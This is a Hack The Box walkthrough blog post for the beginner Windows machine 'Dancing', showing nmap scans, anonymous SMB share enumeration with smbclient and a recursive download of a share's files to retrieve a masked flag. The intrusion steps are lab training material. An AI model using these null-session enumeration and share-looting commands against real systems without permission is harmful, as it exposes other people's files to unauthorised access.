---
title: Dancing
image:
    path: /assets/posts/2025-11-30-dancing/1.png
date: 2025-11-30 17:25:45 +/-TTTT
categories: [HackTheBox]
tags: [HackTheBox, Smb, Smbclient, Port 445-139, Smb Enumeration]
---

"Dancing" is the name of a very easy, Windows-based machine on the Hack The Box (HTB) cybersecurity learning platform. It is part of the "Starting Point" pathway, designed to introduce beginners to basic penetration testing concepts, specifically Server Message Block (SMB) exploitation.

---

## Enumeration

We start by performing a basic TCP port scan against the target to identify open services.
```
❯ nmap 10.129.20.108
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 17:30 -03
Nmap scan report for 10.129.20.108 (10.129.20.108)
Host is up (0.82s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 23.32 seconds
```

Once we know which ports are open, we run a more detailed scan with service/version detection and default scripts to gather more information about each service.
```
❯ nmap 10.129.20.108 -sCV -Pn --min-rate 500  -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 17:37 -03
Nmap scan report for 10.129.20.108 (10.129.20.108)
Host is up (0.21s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m52s
| smb2-time: 
|   date: 2025-12-01T00:38:21
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.95 seconds
```

## Port 445 - SMB

Since SMB (port 445) is open, we enumerate available shares using smbclient with a null session to see what is exposed without credentials.
```
smbclient -N -L //10.129.20.108

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.20.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We then connect directly to the WorkShares share to check if it allows access and to list its contents.
```
smbclient //10.129.20.108/Workshares
Password for [WORKGROUP\pelado]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 05:22:01 2021
  ..                                  D        0  Mon Mar 29 05:22:01 2021
  Amy.J                               D        0  Mon Mar 29 06:08:24 2021
  James.P                             D        0  Thu Jun  3 05:38:03 2021

		5114111 blocks of size 4096. 1734217 blocks available
smbclient //10.129.20.108/Workshares
Password for [WORKGROUP\pelado]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 05:22:01 2021
  ..                                  D        0  Mon Mar 29 05:22:01 2021
  Amy.J                               D        0  Mon Mar 29 06:08:24 2021
  James.P                             D        0  Thu Jun  3 05:38:03 2021

		5114111 blocks of size 4096. 1734217 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \Amy.J\worknotes.txt of size 94 as Amy.J/worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \James.P\flag.txt of size 32 as James.P/flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 
```
To loot the share efficiently, we enable recursion and disable prompts, then use mget * to download all available files to our local machine.

```
❯ ls -la
drwxrwxr-x pelado pelado 4.0 KB Sun Nov 30 17:36:16 2025  .
drwxrwxr-x pelado pelado 4.0 KB Sun Nov 30 17:28:02 2025  ..
drwxrwxr-x pelado pelado 4.0 KB Sun Nov 30 17:36:17 2025  Amy.J
drwxrwxr-x pelado pelado 4.0 KB Sun Nov 30 17:36:20 2025  James.P

❯ tree
.
├── Amy.J
│   └── worknotes.txt
└── James.P
    └── flag.txt

3 directories, 2 files
```
After downloading, we inspect the retrieved files. The notes provide hints about the environment, and the flag.txt file gives us the flag for this stage.
```
❯ cat Amy.J/worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing

❯ cat James.P/flag.txt
5f6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```



